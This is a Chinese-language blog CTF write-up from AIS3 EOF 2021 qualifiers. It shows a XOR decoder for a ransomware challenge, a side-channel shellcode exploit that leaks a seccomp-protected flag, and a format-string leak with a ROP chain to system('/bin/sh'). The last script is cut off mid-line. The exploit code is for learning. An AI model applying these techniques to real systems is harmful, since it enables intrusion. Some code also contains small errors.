@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon-sena16x16.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-sena32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-sena16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto, Noto Sans TC, Noto Sans:300,300italic,400,400italic,700,700italic|Noto Sans TC, Noto Sans:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"twinklestar03.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="第一次參加AIS3 EOF，這次是與其他隊的人一起合組CTF2NOP。腦袋燒了兩天還是沒能把Pwn敲完，離All Kill還差了兩題… 還有許多可以檢討跟進步的地方，這邊放上自己有參與解題的題目所經過的解題過程。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Write-up:: EOF2021-Quals">
+<meta property="og:url" content="https://twinklestar03.com/InfoSec/Writeup_202101_AIS3EOFQuals/index.html">
+<meta property="og:site_name" content="Star&#39;s Note">
+<meta property="og:description" content="第一次參加AIS3 EOF，這次是與其他隊的人一起合組CTF2NOP。腦袋燒了兩天還是沒能把Pwn敲完，離All Kill還差了兩題… 還有許多可以檢討跟進步的地方，這邊放上自己有參與解題的題目所經過的解題過程。">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://i.imgur.com/oq6Crb4.png">
+<meta property="og:image" content="https://i.imgur.com/TqCLXIC.png">
+<meta property="og:image" content="https://i.imgur.com/Gpk9DZr.png">
+<meta property="og:image" content="https://i.imgur.com/Nwy9dqu.png">
+<meta property="og:image" content="https://i.imgur.com/9WaKtU6.png">
+<meta property="article:published_time" content="2021-01-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-01-20T06:13:51.579Z">
+<meta property="article:author" content="TwinkleStar03">
+<meta property="article:tag" content="Writeup">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="EOF2021">
+<meta property="article:tag" content="AIS3 EOF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/oq6Crb4.png">
+
+<link rel="canonical" href="https://twinklestar03.com/InfoSec/Writeup_202101_AIS3EOFQuals/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-TW'
+  };
+</script>
+
+  <title>Write-up:: EOF2021-Quals | Star's Note</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-142199198-1"></script>
+    <script>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-142199198-1');
+      }
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Star's Note" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切換導航欄">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Star's Note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">星筆記</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首頁</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>關於</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分類</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>歸檔</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-TW">
+    <link itemprop="mainEntityOfPage" href="https://twinklestar03.com/InfoSec/Writeup_202101_AIS3EOFQuals/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_sena.png">
+      <meta itemprop="name" content="TwinkleStar03">
+      <meta itemprop="description" content="ヾ(≧▽≦*)o Pwning my world<br>InfoSec // CTFer // Robotics<br>">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Star's Note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Write-up:: EOF2021-Quals
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">發表於</span>
+              
+
+              <time title="創建時間：2021-01-20 00:00:00 / 修改時間：14:13:51" itemprop="dateCreated datePublished" datetime="2021-01-20T00:00:00+08:00">2021-01-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分類於</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/InfoSec/" itemprop="url" rel="index"><span itemprop="name">InfoSec</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>第一次參加AIS3 EOF，這次是與其他隊的人一起合組CTF2NOP。<br>腦袋燒了兩天還是沒能把Pwn敲完，離All Kill還差了兩題…</p>
+<p>還有許多可以檢討跟進步的地方，這邊放上自己有參與解題的題目所經過的解題過程。</p>
+<a id="more"></a>
+
+<hr>
+<h2 id="CTF2NOP-解題概觀"><a href="#CTF2NOP-解題概觀" class="headerlink" title="CTF2NOP 解題概觀"></a>CTF2NOP 解題概觀</h2><p>✅ = 有將過程寫在內文</p>
+<ul>
+<li>Web<ul>
+<li>Zero Storage Flag A</li>
+<li>Zero Storage Flag B</li>
+<li>CYBERPUNK 1977</li>
+</ul>
+</li>
+<li>Reverse<ul>
+<li>abexcm100</li>
+<li>AssemblyLanguageBeast</li>
+<li>Jwangs Terminal</li>
+<li>DuRaRaRa</li>
+<li>ransomeware ✅</li>
+</ul>
+</li>
+<li>Pwn<ul>
+<li>EDUshell ✅</li>
+<li>Illusion ✅</li>
+<li>Messy printer</li>
+</ul>
+</li>
+</ul>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ransomeware"><a href="#ransomeware" class="headerlink" title="ransomeware"></a>ransomeware</h3><p>先找到針對檔案進行加密的Function。</p>
+<p><img src="https://i.imgur.com/oq6Crb4.png"></p>
+<p>可以看出來是做了XOR Encryption，XOR Key可以直接從data段裏頭拉出來，但xor開始的位置是由原始檔案的資訊來決定的。</p>
+<p>此外，還會將最終檔案填充至4096個bytes。</p>
+<p>由於原始檔案未知，所以寫了個Decoder來爆搜Encryption開始的位置，並寫了vaildator來決定這個檔案是不是正確的。</p>
+<p>那vaildator有兩種，分別是.txt跟.jpg。<br>前者在decode過程中檢查是否全都是printable，如果是才繼續decode。<br>後者則是檢查jpg的file magic，如果符合才繼續decode。</p>
+<p><code>decoder.py</code> :</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic_seq, checked = [], <span class="literal">False</span></span><br><span class="line">printable_chars = <span class="built_in">bytes</span>(printable + <span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">key = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: <span class="built_in">int</span>(<span class="string">f&#x27;0x<span class="subst">&#123;x&#125;</span>&#x27;</span>, <span class="number">16</span>), <span class="built_in">open</span>(<span class="string">&#x27;./key.txt&#x27;</span>).read().split()))</span><br><span class="line">print(<span class="string">&#x27;Key loaded.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">arr, off, validator</span>):</span></span><br><span class="line">    ret = []</span><br><span class="line">    checked = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        org = <span class="built_in">bytes</span>([ arr[x] ^ key[(x + off) % <span class="built_in">len</span>(key)] ])</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> validator(org):</span><br><span class="line">            <span class="keyword">return</span> (<span class="literal">False</span>, <span class="literal">None</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> org != <span class="string">b&#x27;\x00&#x27;</span>:</span><br><span class="line">            ret.append(org)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">True</span>, ret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_printable</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> x <span class="keyword">in</span> printable_chars <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_magic</span>(<span class="params">x</span>):</span></span><br><span class="line">    magic_seq.append(x)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(magic_seq) == <span class="number">12</span> <span class="keyword">and</span> <span class="keyword">not</span> checked:</span><br><span class="line">        checked = <span class="literal">True</span></span><br><span class="line">        magic_seq = []</span><br><span class="line">        <span class="keyword">if</span> magic_seq != <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;FFD8FFE000104A4649460001&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="built_in">open</span>(<span class="string">&#x27;./readme.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    status, ret = decrypt(cipher, i, is_printable)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> status:</span><br><span class="line">        print(<span class="string">f&#x27;Offset <span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span> FOUND! file dumped.&#x27;</span>)</span><br><span class="line">        out = <span class="built_in">open</span>(<span class="string">f&#x27;./out<span class="subst">&#123;<span class="built_in">hex</span>(i)&#125;</span>.txt&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> e <span class="keyword">in</span> ret:</span><br><span class="line">            out.write(e)</span><br><span class="line">        out.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;Offset not found...&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>全都解完會得到143張jpg檔，依照readme所要求的用檔案大小排序並把圖片拼回來。</p>
+<p><code>concat.py</code> :</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split</span>(<span class="params">v,sz</span>):</span></span><br><span class="line">    <span class="keyword">return</span> [v[i:i+sz] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(v),sz)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">images,ih</span>):</span></span><br><span class="line">    iw = <span class="number">1</span>-ih</span><br><span class="line">    ws, hs = <span class="built_in">zip</span>(*(i.size <span class="keyword">for</span> i <span class="keyword">in</span> images))</span><br><span class="line">    nw = [<span class="built_in">sum</span>(ws), <span class="built_in">max</span>(ws)][iw]</span><br><span class="line">    nh = [<span class="built_in">sum</span>(hs), <span class="built_in">max</span>(hs)][ih]</span><br><span class="line">    new_im = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (nw,nh))</span><br><span class="line">    x_offset = <span class="number">0</span></span><br><span class="line">    y_offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> im <span class="keyword">in</span> images:</span><br><span class="line">        new_im.paste(im, (x_offset,y_offset))</span><br><span class="line">        x_offset += im.size[<span class="number">0</span>]*ih</span><br><span class="line">        y_offset += im.size[<span class="number">1</span>]*iw</span><br><span class="line">    <span class="keyword">return</span> new_im</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rearrange_images</span>():</span></span><br><span class="line">    images = [<span class="string">f&#x27;./decrypt/<span class="subst">&#123;i&#125;</span>.jpg&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">144</span>)]</span><br><span class="line">    images = [(os.path.getsize(x),x)  <span class="keyword">for</span> x <span class="keyword">in</span> images]</span><br><span class="line">    images = <span class="built_in">sorted</span>(images)[::-<span class="number">1</span>]</span><br><span class="line">    images = [Image.<span class="built_in">open</span>(x) <span class="keyword">for</span> _,x <span class="keyword">in</span> images]</span><br><span class="line">    images = split(images,<span class="number">11</span>)</span><br><span class="line">    images = [merge(x,<span class="number">1</span>) <span class="keyword">for</span> x <span class="keyword">in</span> images]</span><br><span class="line">    images = merge(images,<span class="number">0</span>)</span><br><span class="line">    images.save(<span class="string">&#x27;flag.jpg&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rearrange_images()</span><br></pre></td></tr></table></figure>
+<p>最終的圖片:<br><img src="https://i.imgur.com/TqCLXIC.png"></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="EDUshell"><a href="#EDUshell" class="headerlink" title="EDUshell"></a>EDUshell</h3><p><code>load_flag</code>，會將flag讀到bss段，並設置Seccomp。</p>
+<p><img src="https://i.imgur.com/Gpk9DZr.png" alt="EDUshell_load_flag"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A &#x3D;&#x3D; ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x00000000  if (A !&#x3D; read) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x00000009  if (A !&#x3D; mmap) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A !&#x3D; exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW  </span><br><span class="line"> 0010: 0x15 0x00 0x01 0x000000e7  if (A !&#x3D; exit_group) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure>
+<p>Seccomp上完後就就不會有Output了。</p>
+<p><code>exec</code>會mmap一塊RWX的memory，會讀完input後jmp上去執行。<br><img src="https://i.imgur.com/Nwy9dqu.png" alt="EDUshell_exec"></p>
+<p>無回顯、可以執行任意Shellcode。用Side-channel Attack。<br>把bss上的flag逐一字元抓出來比較，如果對了就讀到Timeout、錯了就直接Crash掉Process。</p>
+<p>Exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> </span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OuO</span>(<span class="params">alpha, offset</span>):</span></span><br><span class="line">    <span class="keyword">global</span> p </span><br><span class="line">    p = remote(<span class="string">&#x27;eofqual.zoolab.org&#x27;</span>, <span class="number">10101</span>)</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;$ &#x27;</span>, <span class="string">&#x27;loadflag&#x27;</span>)</span><br><span class="line">    payload = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        mov rax, qword ptr [rbp+0x8] </span></span><br><span class="line"><span class="string">        sub rax, 0xFFFFFFFFFFFFD733</span></span><br><span class="line"><span class="string">        mov cl, byte ptr [rax+&#123;&#125;]</span></span><br><span class="line"><span class="string">        cmp cl, &#123;&#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    n:</span></span><br><span class="line"><span class="string">        je y</span></span><br><span class="line"><span class="string">        push 0x0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"><span class="string">        ret</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">    y:</span></span><br><span class="line"><span class="string">        ret</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(offset), <span class="built_in">ord</span>(alpha)))</span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">&#x27;exec &#x27;</span>.encode() + payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv(timeout = <span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag, idx = <span class="string">&#x27;FLAG&#123;&#x27;</span>, <span class="number">5</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">for</span> a <span class="keyword">in</span> printable:</span><br><span class="line">                <span class="keyword">if</span> OuO(a, idx):</span><br><span class="line">                    flag += a</span><br><span class="line">                    <span class="keyword">if</span> a == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                        success(<span class="string">f&#x27;Flag FOUND! : <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">                        exit()</span><br><span class="line"></span><br><span class="line">                    idx += <span class="number">1</span></span><br><span class="line">                    success(<span class="string">f&#x27;Success! Now Flag: <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        info(<span class="string">&#x27;Exiting...&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="Illusion"><a href="#Illusion" class="headerlink" title="Illusion"></a>Illusion</h3><p>從Local看的話可以發現有個沒用的Buffer overflow。因為printf會自動在字串後面加上<code>\x00</code>，然後puts讀到<code>\x00</code>才停下。<br>沒辦法Information leak。</p>
+<p><img src="https://i.imgur.com/9WaKtU6.png" alt="Illusion_main"></p>
+<p>Local看不出個所以然，所以就轉移到remote隨便試試看。<br>送個%p居然丟了Address給我，所以我猜remote的環境在不明原因下puts跟printf對調了。</p>
+<p>因為有PIE，所以先Fmt Leak。然後Binary是Partial RELRO，GOT可寫。<br>算出gadgets的位置後，在Stack上放好ROP Chain，再修改<code>exit@got.plt</code>想辦法控制Stack Pointer到ROP Chain上。<br>Exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;/home/Illusion/illusion&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;eofqual.zoolab.org&#x27;</span>, <span class="number">10104</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;STAR%15$p|%11$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;STAR&#x27;</span>)</span><br><span class="line">leak = p.recvline()[:-<span class="number">1</span>].split(<span class="string">b&#x27;|&#x27;</span>)</span><br><span class="line">code_leak = <span class="built_in">int</span>(leak[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(leak[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = libc_leak - (libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>] + <span class="number">243</span>)</span><br><span class="line">code_base = code_leak - <span class="number">0x1211</span></span><br><span class="line">exit_got = code_base + <span class="number">0x5018</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Gadgets</span></span><br><span class="line"><span class="comment"># @Libc</span></span><br><span class="line">system = libc_base + <span class="number">0x55410</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1b75aa</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @Chall</span></span><br><span class="line">pop_r15_ret = code_base + <span class="number">0x2bd2</span></span><br><span class="line">pop_rdi_ret = code_base + <span class="number">0x2bd3</span></span><br><span class="line">ret = code_base + <span class="number">0x101a</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">f&#x27;Leak : <span class="subst">&#123;<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x : <span class="built_in">hex</span>(<span class="built_in">int</span>(x, <span class="number">16</span>)), leak))&#125;</span>&#x27;</span>)</span><br><span class="line">info(<span 